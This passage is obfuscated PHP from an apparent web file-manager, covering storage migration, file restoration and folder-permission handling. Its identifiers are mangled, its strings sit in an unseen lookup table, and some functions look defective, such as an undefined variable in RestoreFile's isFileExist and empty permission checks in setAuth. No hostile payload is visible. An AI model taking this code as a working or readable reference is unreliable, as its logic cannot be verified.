_fileFilter($ÇçìîºÛ) { $¨Ó‹ªå… =& $_SERVER[©—Ò»ÅĞ]; return; if (empty($ÇçìîºÛ)) { return; } $ş‰š¾ÙÙ = array($¨Ó‹ªå…[557] => array($¨Ó‹ªå…[7], array_unique($ÇçìîºÛ))); $´¡ğü¢ = Model($¨Ó‹ªå…[933])->where($ş‰š¾ÙÙ)->field($¨Ó‹ªå…[191])->select(); foreach ($´¡ğü¢ as $¨äšÊ°Í) { Model($¨Ó‹ªå…[933])->remove($¨äšÊ°Í[$¨Ó‹ªå…[191]], !1); } } private function storeIds() { $›–ƒ¨ùÜ =& $_SERVER[©—Ò»ÅĞ]; $–ò±ĞåÆ = Model($›–ƒ¨ùÜ[868])->listData(); $· Šƒè = array(); $““Ì¢§ = $GLOBALS[$›–ƒ¨ùÜ[6]][$›–ƒ¨ùÜ[92]][$›–ƒ¨ùÜ[934]]; foreach ($–ò±ĞåÆ as $ìºÚ‰Œ¯) { $ÊëÀÕÇ’ = strtolower($ìºÚ‰Œ¯[$›–ƒ¨ùÜ[96]]); if (!isset($““Ì¢§[$ÊëÀÕÇ’])) { continue; } $€ëåØ¦Ë = $›–ƒ¨ùÜ[77] . (isset($““Ì¢§[$ÊëÀÕÇ’]) ? $““Ì¢§[$ÊëÀÕÇ’] : ucfirst($ÊëÀÕÇ’)); if (!class_exists($€ëåØ¦Ë)) { continue; } $· Šƒè[] = $ìºÚ‰Œ¯[$›–ƒ¨ùÜ[487]]; } return $· Šƒè; } public function start($ùìäÌÑì, $•Ó´Éº—) { $ÕÎ¡øõ =& $_SERVER[©—Ò»ÅĞ]; $ö´‹©¨µ = KodIO::makePath(KodIO::KOD_IO, $ùìäÌÑì); if (!$this->checkStore($ùìäÌÑì)) { write_log($ÕÎ¡øõ[935] . $ö´‹©¨µ, $ÕÎ¡øõ[936]); return; } $Ä® ıç = KodIO::defaultDriver(); if ($Ä® ıç[$ÕÎ¡øõ[487]] == $ùìäÌÑì) { write_log($ÕÎ¡øõ[937] . $ö´‹©¨µ, $ÕÎ¡øõ[936]); return; } $Éèıˆ¯Ë = $ÕÎ¡øõ[938]; $µûÏ†Èñ = Task::get($Éèıˆ¯Ë); if ($µûÏ†Èñ) { if ($µûÏ†Èñ[$ÕÎ¡øõ[850]] == $ÕÎ¡øõ[939]) { return; } Task::kill($Éèıˆ¯Ë); } $ÜÃ½ÁÁˆ = array($ÕÎ¡øõ[852] => $ùìäÌÑì, $ÕÎ¡øõ[557] => 0, $ÕÎ¡øõ[204] => 0, $ÕÎ¡øõ[856] => array($ÕÎ¡øõ[859] => 0, $ÕÎ¡øõ[940] => 0, $ÕÎ¡øõ[864] => 0, $ÕÎ¡øõ[941] => 0, $ÕÎ¡øõ[942] => 0)); $ªí–úı’ = Model($ÕÎ¡øõ[873])->get($ÕÎ¡øõ[943], $ÕÎ¡øõ[879]); $ªí–úı’ = json_decode($ªí–úı’, !0); if (!$ªí–úı’) { $ªí–úı’ = array(); } if ($ªí–úı’[$ÕÎ¡øõ[852]] && $ªí–úı’[$ÕÎ¡øõ[852]] != $ùìäÌÑì) { $ªí–úı’[$ÕÎ¡øõ[557]] = 0; $ªí–úı’[$ÕÎ¡øõ[852]] = $ùìäÌÑì; } $ªí–úı’ = array_merge($ÜÃ½ÁÁˆ, $ªí–úı’); $ßÁªëºí = _get($GLOBALS, $ÕÎ¡øõ[7], array()); if ($ßÁªëºí[$ÕÎ¡øõ[855]] == $ÕÎ¡øõ[91] && $ßÁªëºí[$ÕÎ¡øõ[944]] == $ÕÎ¡øõ[91] || !$ªí–úı’[$ÕÎ¡øõ[557]]) { $ªí–úı’ = $ÜÃ½ÁÁˆ; } $ö´‹©¨µ = KodIO::makePath(KodIO::KOD_IO, $ªí–úı’[$ÕÎ¡øõ[852]]); $ÂÜÜ¸•­ = $ö´‹©¨µ . $ÕÎ¡øõ[945]; if (!file_exists($ÂÜÜ¸•­)) { $êµåéô¾ = file_get_contents(__DIR__ . $ÕÎ¡øõ[946]); if (defined($ÕÎ¡øõ[947]) && INSTALL_CHANNEL) { $êµåéô¾ = str_replace($ÕÎ¡øõ[948], INSTALL_CHANNEL, $êµåéô¾); } file_put_contents($ÂÜÜ¸•­, $êµåéô¾); } $ã­‹šáî = $•Ó´Éº— * 60 * 0.8; $®•ŞØêÏ = timeFloat(); $éÔˆ¹Ú = Model($ÕÎ¡øõ[560]); $ËÒ†å = array($ÕÎ¡øõ[558] => array($ÕÎ¡øõ[914], $ªí–úı’[$ÕÎ¡øõ[557]])); $ÔÛš¾Ÿê = $éÔˆ¹Ú->field(array($ÕÎ¡øõ[949] => $ÕÎ¡øõ[950], $ÕÎ¡øõ[951] => $ÕÎ¡øõ[79]))->where($ËÒ†å)->find(); if (!$ÔÛš¾Ÿê[$ÕÎ¡øõ[950]]) { return; } $»ÑÙ¢ü = intval($ÔÛš¾Ÿê[$ÕÎ¡øõ[950]]); $Ëú––‘ = intval($ÔÛš¾Ÿê[$ÕÎ¡øõ[79]]); $ªí–úı’[$ÕÎ¡øõ[856]][$ÕÎ¡øõ[859]] += $»ÑÙ¢ü; $ªí–úı’[$ÕÎ¡øõ[856]][$ÕÎ¡øõ[864]] += $Ëú––‘; $ªí–úı’[$ÕÎ¡øõ[204]] = time(); Model($ÕÎ¡øõ[873])->set($ÕÎ¡øõ[943], $ªí–úı’, $ÕÎ¡øõ[879]); $µûÏ†Èñ = new TaskFileTransfer($Éèıˆ¯Ë, $ÕÎ¡øõ[879], $»ÑÙ¢ü, LNG($ÕÎ¡øõ[887]) . $ÕÎ¡øõ[888] . LNG($ÕÎ¡øõ[918])); $µûÏ†Èñ->task[$ÕÎ¡øõ[864]] = $Ëú––‘; $‡ß¼š›Ï = 500; $€˜ğ©Ò– = 1; $óªàËô = $ÕÎ¡øõ[922]; $ü¼œİß  = $éÔˆ¹Ú->where($ËÒ†å)->field($óªàËô)->order($ÕÎ¡øõ[923])->selectPage($‡ß¼š›Ï, $€˜ğ©Ò–); $ƒóüß‡„ = array($ÕÎ¡øõ[859] => 0, $ÕÎ¡øõ[952] => 0, $ÕÎ¡øõ[942] => 0, $ÕÎ¡øõ[953] => $ªí–úı’[$ÕÎ¡øõ[557]], $ÕÎ¡øõ[954] => 0); $¹Õì¶÷È = intval($ü¼œİß [$ÕÎ¡øõ[443]][$ÕÎ¡øõ[445]]); while ($ü¼œİß  && $€˜ğ©Ò– <= $¹Õì¶÷È) { if (timeFloat() - $®•ŞØêÏ > $ã­‹šáî) { break; } foreach ($ü¼œİß [$ÕÎ¡øõ[446]] as $›íóï¨) { if (timeFloat() - $®•ŞØêÏ > $ã­‹šáî) { break; } $ƒóüß‡„[$ÕÎ¡øõ[859]]++; $ƒóüß‡„[$ÕÎ¡øõ[954]] = $›íóï¨[$ÕÎ¡øõ[557]]; $ªí–úı’[$ÕÎ¡øõ[557]] = $›íóï¨[$ÕÎ¡øõ[557]]; $ªí–úı’[$ÕÎ¡øõ[856]][$ÕÎ¡øõ[940]]++; $ªí–úı’[$ÕÎ¡øõ[856]][$ÕÎ¡øõ[941]] += $›íóï¨[$ÕÎ¡øõ[79]]; $áÍÎì¹ = $›íóï¨[$ÕÎ¡øõ[87]]; if (!$this->isFileExist($›íóï¨, $éÔˆ¹Ú)) { $µûÏ†Èñ->updateFileEnd($›íóï¨[$ÕÎ¡øõ[32]], $›íóï¨[$ÕÎ¡øõ[79]]); $ªí–úı’[$ÕÎ¡øõ[856]][$ÕÎ¡øõ[942]]++; $ƒóüß‡„[$ÕÎ¡øõ[952]]++; write_log($ÕÎ¡øõ[924] . $›íóï¨[$ÕÎ¡øõ[557]] . $ÕÎ¡øõ[925] . $áÍÎì¹, $ÕÎ¡øõ[936]); continue; } $ĞöíŸÙß = $ö´‹©¨µ . substr($áÍÎì¹, strlen("\x7b\x69\x6f\x3a{$›íóï¨[$ÕÎ¡øõ[926]]}\x7d\x2f")); if (IO::exist($ĞöíŸÙß)) { $µûÏ†Èñ->updateFileEnd($›íóï¨[$ÕÎ¡øõ[32]], $›íóï¨[$ÕÎ¡øõ[79]]); continue; } $ĞöíŸÙß = get_path_father($ĞöíŸÙß); if (!IO::copy($áÍÎì¹, $ĞöíŸÙß, REPEAT_SKIP)) { $ªí–úı’[$ÕÎ¡øõ[856]][$ÕÎ¡øõ[942]]++; $ƒóüß‡„[$ÕÎ¡øõ[942]]++; write_log($ÕÎ¡øõ[955] . $›íóï¨[$ÕÎ¡øõ[557]] . $ÕÎ¡øõ[925] . $áÍÎì¹, $ÕÎ¡øõ[936]); } $µûÏ†Èñ->updateFileEnd($›íóï¨[$ÕÎ¡øõ[32]], $›íóï¨[$ÕÎ¡øõ[79]]); } Model($ÕÎ¡øõ[873])->set($ÕÎ¡øõ[943], $ªí–úı’, $ÕÎ¡øõ[879]); $€˜ğ©Ò–++; $ü¼œİß  = $éÔˆ¹Ú->where($ËÒ†å)->field($óªàËô)->order($ÕÎ¡øõ[923])->selectPage($‡ß¼š›Ï, $€˜ğ©Ò–); } $µûÏ†Èñ->end(); write_log($ÕÎ¡øõ[956] . json_encode($ƒóüß‡„), $ÕÎ¡øõ[936]); if (IO::mkdir($ö´‹©¨µ . $ÕÎ¡øõ[957])) { $ƒóüß‡„[$ÕÎ¡øõ[954]] = $ªí–úı’[$ÕÎ¡øõ[557]]; IO::setContent($ö´‹©¨µ . $ÕÎ¡øõ[958] . date($ÕÎ¡øõ[959]) . $ÕÎ¡øõ[960], json_encode($ƒóüß‡„)); } Model($ÕÎ¡øõ[873])->set($ÕÎ¡øõ[943], $ªí–úı’, $ÕÎ¡øõ[879]); return !0; } private function isFileExist($ÈÂˆúÕõ, $áÍ¶ßÆ) { $ÓÈ Á»© =& $_SERVER[©—Ò»ÅĞ]; static $øİô±º = null; static $¶î³˜ı = null; if (is_null($øİô±º)) { $øİô±º = $¶î³˜ı = array(); } $¨±Ì‘Ïœ = $ÈÂˆúÕõ[$ÓÈ Á»©[926]]; $‘Ş­ıËò = KodIO::parse($ÈÂˆúÕõ[$ÓÈ Á»©[87]]); if ($¨±Ì‘Ïœ != $‘Ş­ıËò[$ÓÈ Á»©[487]]) { return !1; } if (!isset($øİô±º[$¨±Ì‘Ïœ])) { $øİô±º[$¨±Ì‘Ïœ] = $this->checkStore($¨±Ì‘Ïœ); } if ($øİô±º[$¨±Ì‘Ïœ] !== 1) { return !1; } if (in_array($ÈÂˆúÕõ[$ÓÈ Á»©[557]], $¶î³˜ı)) { return !1; } $¬“–˜•— = $ÈÂˆúÕõ[$ÓÈ Á»©[87]]; if (IO::exist($¬“–˜•—)) { return !0; } $ÈİÁßµ = get_path_father($¬“–˜•—); if (IO::exist($ÈİÁßµ)) { $¶î³˜ı[] = $ÈÂˆúÕõ[$ÓÈ Á»©[557]]; return !1; } $ÅÍÂã— = array($ÓÈ Á»©[926] => $¨±Ì‘Ïœ, $ÓÈ Á»©[87] => array($ÓÈ Á»©[473], "{$ÈİÁßµ}\45")); $å²¨âÉ = $áÍ¶ßÆ->where($ÅÍÂã—)->field($ÓÈ Á»©[558])->select(); $¶î³˜ı = array_merge($¶î³˜ı, array_to_keyvalue($å²¨âÉ, $ÓÈ Á»©[12], $ÓÈ Á»©[557])); return !1; } public function checkStore($†ÙãÉ Â) { static $®ìüóÁÈ; if (is_null($®ìüóÁÈ)) { $®ìüóÁÈ = Model($_SERVER[©—Ò»ÅĞ][868]); } $Ê©Åö×Í = $®ìüóÁÈ->listData($†ÙãÉ Â); if (!$Ê©Åö×Í) { return 0; } try { $ä³âš‡§ = $®ìüóÁÈ->checkConfig($Ê©Åö×Í, !0); } catch (Exception $ì „üÆ¨) { $ä³âš‡§ = !1; } return $ä³âš‡§ === !0 ? 1 : 0; } } class RestoreFile { public $message; public function __construct() { } public function start($µ®÷¥‰) { $÷³‚½ =& $_SERVER[©—Ò»ÅĞ]; $øÌäÏ£ñ = Model($÷³‚½[873]); if ($øÌäÏ£ñ->get($÷³‚½[961]) == $÷³‚½[962]) { $this->message = LNG($÷³‚½[963]); return !1; } $µ®÷¥‰ = rtrim($µ®÷¥‰, $÷³‚½[8]) . $÷³‚½[8]; $•¾©‡Ê— = IO::listPath($µ®÷¥‰); if (empty($•¾©‡Ê—[$÷³‚½[85]]) && empty($•¾©‡Ê—[$÷³‚½[86]])) { show_json(LNG($÷³‚½[964]), !1); } $ÑùÎ„èè = $÷³‚½[965]; $²©Ùçşú = Task::get($ÑùÎ„èè); if ($²©Ùçşú) { if ($²©Ùçşú[$÷³‚½[850]] == $÷³‚½[939]) { $this->message = LNG($÷³‚½[966]); return !0; } Task::kill($ÑùÎ„èè); } $€üüşßŸ = array($÷³‚½[87] => $µ®÷¥‰, $÷³‚½[557] => 0, $÷³‚½[204] => 0, $÷³‚½[856] => array($÷³‚½[859] => 0, $÷³‚½[940] => 0, $÷³‚½[864] => 0, $÷³‚½[941] => 0, $÷³‚½[942] => 0), $÷³‚½[967] => array($÷³‚½[859] => 0, $÷³‚½[940] => 0, $÷³‚½[942] => 0)); $ñ—ö¥õá = $øÌäÏ£ñ->get($÷³‚½[943], $÷³‚½[968]); $ñ—ö¥õá = json_decode($ñ—ö¥õá, !0); if (!$ñ—ö¥õá) { $ñ—ö¥õá = array(); } $ñ—ö¥õá = array_merge($€üüşßŸ, $ñ—ö¥õá); if (_get($GLOBALS, $÷³‚½[969], 0) == $÷³‚½[91] || !$ñ—ö¥õá[$÷³‚½[557]]) { $ñ—ö¥õá = $€üüşßŸ; } $‹äÔÆö = Model($÷³‚½[560]); $»ùôÒ™ñ = array($÷³‚½[558] => array($÷³‚½[914], $ñ—ö¥õá[$÷³‚½[557]])); $¬ñÂ÷˜Î = $‹äÔÆö->field(array($÷³‚½[949] => $÷³‚½[950], $÷³‚½[951] => $÷³‚½[79]))->where($»ùôÒ™ñ)->find(); if (!intval($¬ñÂ÷˜Î[$÷³‚½[950]])) { $this->message = LNG($÷³‚½[970]); return !0; } $İç¡Æ = intval($¬ñÂ÷˜Î[$÷³‚½[950]]); $©Àƒ‹’µ = intval($¬ñÂ÷˜Î[$÷³‚½[79]]); $ñ—ö¥õá[$÷³‚½[856]][$÷³‚½[859]] += $İç¡Æ; $ñ—ö¥õá[$÷³‚½[856]][$÷³‚½[864]] += $©Àƒ‹’µ; $ñ—ö¥õá[$÷³‚½[967]][$÷³‚½[859]] = $İç¡Æ; $ñ—ö¥õá[$÷³‚½[204]] = time(); $øÌäÏ£ñ->set($÷³‚½[943], $ñ—ö¥õá, $÷³‚½[968]); $ÃÛÇ€›ˆ = KodIO::defaultDriver(); $ÕÊÓÀÌ¯ = $ÃÛÇ€›ˆ[$÷³‚½[487]]; $ôÖÛ¿™ = KodIO::makePath(KodIO::KOD_IO, $ÕÊÓÀÌ¯); $²©Ùçşú = new TaskFileTransfer($ÑùÎ„èè, $÷³‚½[968], $İç¡Æ, LNG($÷³‚½[971]) . $÷³‚½[888] . LNG($÷³‚½[918])); $²©Ùçşú->task[$÷³‚½[864]] = $©Àƒ‹’µ; $õ¦Àû‚ = 1000; $”€Ğœ‰ü = 1; $„û­ÓÈæ = $÷³‚½[922]; $•¾©‡Ê— = $‹äÔÆö->where($»ùôÒ™ñ)->field($„û­ÓÈæ)->order($÷³‚½[923])->selectPage($õ¦Àû‚, $”€Ğœ‰ü); $¸¬›ûà = intval($•¾©‡Ê—[$÷³‚½[443]][$÷³‚½[445]]); while ($•¾©‡Ê— && $”€Ğœ‰ü <= $¸¬›ûà) { $…½ª¢—æ = array(); foreach ($•¾©‡Ê—[$÷³‚½[446]] as $úêëÒÕ) { $ñ—ö¥õá[$÷³‚½[557]] = $úêëÒÕ[$÷³‚½[557]]; $ñ—ö¥õá[$÷³‚½[856]][$÷³‚½[940]]++; $ñ—ö¥õá[$÷³‚½[856]][$÷³‚½[941]] += $úêëÒÕ[$÷³‚½[79]]; $ñ—ö¥õá[$÷³‚½[967]][$÷³‚½[940]]++; $¦ÏØ“èì = $úêëÒÕ[$÷³‚½[87]]; if (IO::exist($¦ÏØ“èì)) { $²©Ùçşú->update(1); continue; } $ÄÒ¤ = substr($¦ÏØ“èì, strlen("\x7b\151\157\72{$úêëÒÕ[$÷³‚½[926]]}\175\x2f")); $ú¤ƒ¹° = $ôÖÛ¿™ . $ÄÒ¤; if ($ÕÊÓÀÌ¯ != $úêëÒÕ[$÷³‚½[926]] && IO::exist($ú¤ƒ¹°)) { $²©Ùçşú->update(1); $…½ª¢—æ[$úêëÒÕ[$÷³‚½[557]]] = $ú¤ƒ¹°; continue; } $Ü¡¨£àÊ = $µ®÷¥‰ . $ÄÒ¤; if (!$this->isFileExist($Ü¡¨£àÊ)) { $²©Ùçşú->update(1); $ñ—ö¥õá[$÷³‚½[856]][$÷³‚½[942]]++; $ñ—ö¥õá[$÷³‚½[967]][$÷³‚½[942]]++; write_log($÷³‚½[972] . $Ü¡¨£àÊ, $÷³‚½[973]); continue; } $€¶–ßøà = get_path_father($ú¤ƒ¹°); IO::mkdir($€¶–ßøà); if (!IO::copy($Ü¡¨£àÊ, $€¶–ßøà, REPEAT_SKIP)) { $ñ—ö¥õá[$÷³‚½[856]][$÷³‚½[942]]++; $ñ—ö¥õá[$÷³‚½[967]][$÷³‚½[942]]++; write_log($÷³‚½[974] . $Ü¡¨£àÊ . $÷³‚½[975] . $úêëÒÕ[$÷³‚½[557]], $÷³‚½[973]); } else { $…½ª¢—æ[$úêëÒÕ[$÷³‚½[557]]] = $ú¤ƒ¹°; } $²©Ùçşú->update(1); } $this->updateFileBatch($ñ—ö¥õá, $…½ª¢—æ, $ÕÊÓÀÌ¯); $”€Ğœ‰ü++; $•¾©‡Ê— = $‹äÔÆö->where($»ùôÒ™ñ)->field($„û­ÓÈæ)->order($÷³‚½[923])->selectPage($õ¦Àû‚, $”€Ğœ‰ü); } $²©Ùçşú->end(); $this->updateFileBatch($ñ—ö¥õá, $…½ª¢—æ, $ÕÊÓÀÌ¯); $•¾©‡Ê— = Model($÷³‚½[868])->listData(); $Ö®ïò¢ = array_to_keyvalue($•¾©‡Ê—, $÷³‚½[12], $÷³‚½[487]); $…øİ‚‚ = md5($÷³‚½[976] . implode($÷³‚½[50], $Ö®ïò¢)); Cache::remove($…øİ‚‚); return !0; } private function isFileExist($ı´ôúÔ) { static $Áê’²µ» = null; if (is_null($ÑŸâÍÑ)) { $Áê’²µ» = array(); } $ıÊäÛÁ„ = get_path_father($ı´ôúÔ); if (in_array($ıÊäÛÁ„, $Áê’²µ»)) { return !1; } if (!IO::exist($ıÊäÛÁ„)) { $Áê’²µ»[] = $ıÊäÛÁ„; return !1; } return IO::exist($ı´ôúÔ); } private function updateFileBatch($ØÉ˜§, &$ó¨ïË•Ë, $œßÔÊé‘) { $±É¾¯”½ =& $_SERVER[©—Ò»ÅĞ]; Model($±É¾¯”½[873])->set($±É¾¯”½[943], $ØÉ˜§, $±É¾¯”½[968]); if (!$ó¨ïË•Ë) { return; } $ÓÈÆ¶½ = Model($±É¾¯”½[560]); $Ú‚‹ˆ½ = $óÀÓ…ÃÖ = array(); foreach ($ó¨ïË•Ë as $’Ñ­®° => $©´‘ÔÏï) { $Ú‚‹ˆ½[] = array($±É¾¯”½[557], $’Ñ­®°, $±É¾¯”½[926], $œßÔÊé‘); $óÀÓ…ÃÖ[] = array($±É¾¯”½[557], $’Ñ­®°, $±É¾¯”½[87], $©´‘ÔÏï); } $ÓÈÆ¶½->saveAll($Ú‚‹ˆ½); $ÓÈÆ¶½->saveAll($óÀÓ…ÃÖ); write_log($±É¾¯”½[977] . count($ó¨ïË•Ë) . $±É¾¯”½[978] . $œßÔÊé‘, $±É¾¯”½[973]); $ó¨ïË•Ë = array(); } private function updateFile($ÖÙûœ¨ò, $êÕ“ÍŸî, $íä¨¨Ü§, $Ğªšö¸á) { $¤ü”¿äİ =& $_SERVER[©—Ò»ÅĞ]; $©×şÊ¢Ä = array($¤ü”¿äİ[926] => $êÕ“ÍŸî, $¤ü”¿äİ[87] => $íä¨¨Ü§); $ü¶ß•¼¥ = $Ğªšö¸á->where(array($¤ü”¿äİ[557] => $ÖÙûœ¨ò))->save($©×şÊ¢Ä); if ($ü¶ß•¼¥) { return; } write_log($¤ü”¿äİ[979] . $ÖÙûœ¨ò, $¤ü”¿äİ[973]); } } goto fêĞôÔÃ·‘; C—¶èë•›²: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\143\x65\137\x61\x75\164\x68"; public function getAuth($É˜±©ûê) { $¦†È£Ï¦ =& $_SERVER[©—Ò»ÅĞ]; $¡ÚÀ¶Ûè = $this->sourceAuthSelect($É˜±©ûê); $¤¤ô´û• = array(); $Ù»Ö¤ƒ³ = array(); $¡ïÓ©ˆ = 2 << 25; foreach ($¡ÚÀ¶Ûè as $³óü£‘‰) { $¨÷šÀ…ö = Model($¦†È£Ï¦[591])->listData($³óü£‘‰[$¦†È£Ï¦[1640]]); if (!$¨÷šÀ…ö) { continue; } $¤¤ô´û•[] = $³óü£‘‰; $ÂÙÙ†ï = 0; if ($³óü£‘‰[$¦†È£Ï¦[188]] == SourceModel::TYPE_GROUP) { $ÂÙÙ†ï = $¡ïÓ©ˆ * 2; } if ($³óü£‘‰[$¦†È£Ï¦[188]] == SourceModel::TYPE_USER) { $ÂÙÙ†ï = $¡ïÓ©ˆ; } if ($³óü£‘‰[$¦†È£Ï¦[188]] == SourceModel::TYPE_USER && $³óü£‘‰[$¦†È£Ï¦[589]] == $¦†È£Ï¦[228]) { $ÂÙÙ†ï = 0; } $Ù»Ö¤ƒ³[] = $¨÷šÀ…ö[$¦†È£Ï¦[502]] + $ÂÙÙ†ï; } array_multisort($Ù»Ö¤ƒ³, SORT_DESC, $¤¤ô´û•); return $¤¤ô´û•; } public function sourceAuthSelect($Âï®ˆá‡) { $§”ÅåÙ† =& $_SERVER[©—Ò»ÅĞ]; static $æ›Á®±¬ = array(); $ÛÔ†‹ˆ³ = is_array($Âï®ˆá‡) ? !1 : !0; if ($ÛÔ†‹ˆ³) { $Âï®ˆá‡ = array($Âï®ˆá‡); } $¢ñé¥‡Û = array(); foreach ($Âï®ˆá‡ as $©µŠÕé) { if (isset($æ›Á®±¬[$©µŠÕé])) { $¢ñé¥‡Û[$©µŠÕé] = $æ›Á®±¬[$©µŠÕé]; } } if (count($¢ñé¥‡Û) == count($Âï®ˆá‡)) { return $ÛÔ†‹ˆ³ ? $¢ñé¥‡Û[$Âï®ˆá‡[0]] : $¢ñé¥‡Û; } $õÑ…ëĞê = $§”ÅåÙ†[2367]; $±¥ŞŸèó = array($§”ÅåÙ†[191] => array($§”ÅåÙ†[7], $Âï®ˆá‡)); $½”øş° = $this->field($õÑ…ëĞê)->order($§”ÅåÙ†[487])->where($±¥ŞŸèó)->select(); $ŸáÊ‚Á† = array_to_keyvalue_group($½”øş°, $§”ÅåÙ†[191]); foreach ($Âï®ˆá‡ as $©µŠÕé) { $æ›Á®±¬[$©µŠÕé] = $ŸáÊ‚Á†[$©µŠÕé] ? $ŸáÊ‚Á†[$©µŠÕé] : array(); } if ($ÛÔ†‹ˆ³) { return $½”øş°; } return $ŸáÊ‚Á†; } public function setAuth($†ç“³§¸, $ó¹”šº¿) { $Â©ùÑˆù =& $_SERVER[©—Ò»ÅĞ]; $ÙÒÄ±öÇ = Model($Â©ùÑˆù[1533])->sourceInfo($†ç“³§¸); if (!$ÙÒÄ±öÇ) { return !1; } if ($ÙÒÄ±öÇ[$Â©ùÑˆù[188]] != SourceModel::TYPE_GROUP) { return !1; } $ÖÂÂªÇÕ = 1; $±é±¥÷Æ = $ÙÒÄ±öÇ[$Â©ùÑˆù[589]]; if ($±é±¥÷Æ != $ÖÂÂªÇÕ) { $¸¨‹üÉá = array($Â©ùÑˆù[1495] => $±é±¥÷Æ); $·Úü Õ£ = Model($Â©ùÑˆù[2277])->field($Â©ùÑˆù[1592])->where($¸¨‹üÉá)->select(); $·Úü Õ£ = array_to_keyvalue($·Úü Õ£, $Â©ùÑˆù[12], $Â©ùÑˆù[1592]); } $‡‹ïë¥“ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $­Û²´ò° = array(); foreach ($ó¹”šº¿ as $”†ÇÛÅ) { if (!in_array($”†ÇÛÅ[$Â©ùÑˆù[188]], $‡‹ïë¥“)) { show_json(LNG($Â©ùÑˆù[2368]), !1); } if ($±é±¥÷Æ != $ÖÂÂªÇÕ) { if ($”†ÇÛÅ[$Â©ùÑˆù[188]] == SourceModel::TYPE_GROUP) { } if ($”†ÇÛÅ[$Â©ùÑˆù[589]] != 0 && !in_array($”†ÇÛÅ[$Â©ùÑˆù[589]], $·Úü Õ£)) { } } if ($”†ÇÛÅ[$Â©ùÑˆù[589]] == 0) { $”†ÇÛÅ[$Â©ùÑˆù[188]] = SourceModel::TYPE_USER; } $­Û²´ò°[] = array($Â©ùÑˆù[191] => $†ç“³§¸, $Â©ùÑˆù[188] => intval($”†ÇÛÅ[$Â©ùÑˆù[188]]), $Â©ùÑˆù[589] => intval($”†ÇÛÅ[$Â©ùÑˆù[589]]), $Â©ùÑˆù[1640] => intval($”†ÇÛÅ[$Â©ùÑˆù[1640]]) ? intval($”†ÇÛÅ[$Â©ùÑˆù[1640]]) : 0, $Â©ùÑˆù[2346] => intval($”†ÇÛÅ[$Â©ùÑˆù[2346]]) ? intval($”†ÇÛÅ[$Â©ùÑˆù[2346]]) : -1); } $this->where(array($Â©ùÑˆù[506] => $†ç“³§¸))->delete(); $this->addAll($­Û²´ò°); return !0; } public function authClear($ú„¹Ÿİ) { $ı°«ßÖä =& $_SERVER[©—Ò»ÅĞ]; $Ô¶ØÏÁß = Model($ı°«ßÖä[1533])->sourceInfo($ú„¹Ÿİ); $…Óê’Ó = array($ú„¹Ÿİ); if ($Ô¶ØÏÁß[$ı°«ßÖä[500]] == $ı°«ßÖä[91]) { $àŒşÊÈ = array($ı°«ßÖä[674] => array($ı°«ßÖä[635], $Ô¶ØÏÁß[$ı°«ßÖä[604]] . $ú„¹Ÿİ . $ı°«ßÖä[636])); $…Óê’Ó = Model($ı°«ßÖä[1533])->field($ı°«ßÖä[506])->where($àŒşÊÈ)->getField($ı°«ßÖä[191], !0); $…Óê’Ó[] = $ú„¹Ÿİ; } $this->where(array($ı°«ßÖä[506] => array($ı°«ßÖä[507], $…Óê’Ó)))->delete(); return !0; } public function getAllParent($Õúï¯¸å) { $‰üÏó× =& $_SERVER[©—Ò»ÅĞ]; $ŞÎîŞ±° = Model($‰üÏó×[1533])->sourceInfo($Õúï¯¸å); if (!$ŞÎîŞ±° || $ŞÎîŞ±°[$‰üÏó×[188]] != SourceModel::TYPE_GROUP) { return array(); } $ÄçŞ‘İ² = Model($‰üÏó×[1533])->parentLevelArray($ŞÎîŞ±°[$‰üÏó×[604]]); $ó«ó¹Ã = array_merge(array(intval($Õúï¯¸å)), array_reverse($ÄçŞ‘İ²)); $Ø€Şì£ = $this->sourceAuthSelect($ó«ó¹Ã); $¼ƒ«÷ì’ = $GLOBALS[$‰üÏó×[6]][$‰üÏó×[92]][$‰üÏó×[2290]] == 1; $Í—£ëˆ = $¼ƒ«÷ì’ ? 3 : 2; $’£›¶ïã = Model($‰üÏó×[1493])->getInfo($ŞÎîŞ±°[$‰üÏó×[589]]); $Â›¢¼è™ = explode($‰üÏó×[50], trim($’£›¶ïã[$‰üÏó×[604]], $‰üÏó×[50])); $òÌ½²ûå = array_merge(array($’£›¶ïã[$‰üÏó×[1495]]), array_reverse(array_slice($Â›¢¼è™, $Í—£ëˆ))); foreach ($Ø€Şì£ as $Õúï¯¸å => $Âí¯˜›ş) { foreach ($Âí¯˜›ş as $ı®ö´ú•) { if (!$ı®ö´ú• || !$ı®ö´ú•[$‰üÏó×[589]] || $ı®ö´ú•[$‰üÏó×[589]] == $‰üÏó×[228]) { continue; } if ($ı®ö´ú•[$‰üÏó×[188]] != SourceModel::TYPE_GROUP) { continue; } $òÌ½²ûå[] = $ı®ö´ú•[$‰üÏó×[589]]; } } $òÌ½²ûå = array_unique($òÌ½²ûå); $ÁÁÌœáû = array($‰üÏó×[428] => _get($GLOBALS[$‰üÏó×[7]], $‰üÏó×[428], 1), $‰üÏó×[439] => _get($GLOBALS[$‰üÏó×[7]], $‰üÏó×[439], 500)); $GLOBALS[$‰üÏó×[7]][$‰üÏó×[428]] = 1; $GLOBALS[$‰üÏó×[7]][$‰üÏó×[439]] = 500; $…Ğú‹°± = array($‰üÏó×[508] => 0, $‰üÏó×[2189] => AuthModel::authAll(), $‰üÏó×[509] => LNG($‰üÏó×[2369]), $‰üÏó×[2204] => $‰üÏó×[2370]); $ÑÅËˆä¬ = array(); $½ÃŒìğ = explode($‰üÏó×[50], $‰üÏó×[2371]); $ŒØŞûì¸ = explode($‰üÏó×[50], $‰üÏó×[2372]); foreach ($òÌ½²ûå as $‰­ÆÇÛª) { $ğşïöÅÁ = Model($‰üÏó×[1493])->getInfo($‰­ÆÇÛª); $ˆë¶ú¼š = array_field_key($ğşïöÅÁ, $½ÃŒìğ); $¦‰º·Å = Model($‰üÏó×[617])->listByGroup($‰­ÆÇÛª); foreach ($¦‰º·Å[$‰üÏó×[446]] as $â—¶ºß => $ıçş‘€Ş) { $this->userGroupList($ıçş‘€Ş[$‰üÏó×[1592]], $ıçş‘€Ş); $é™æÜÅ = $ıçş‘€Ş[$‰üÏó×[1592]] . $‰üÏó×[12]; if (isset($ÑÅËˆä¬[$é™æÜÅ])) { continue; } $ı…ÀÆ = Model($‰üÏó×[2373])->listData($ıçş‘€Ş[$‰üÏó×[2374]]); $ıçş‘€Ş[$‰üÏó×[2375]] = Action($‰üÏó×[2376])->parseUrl($ıçş‘€Ş[$‰üÏó×[2375]]); 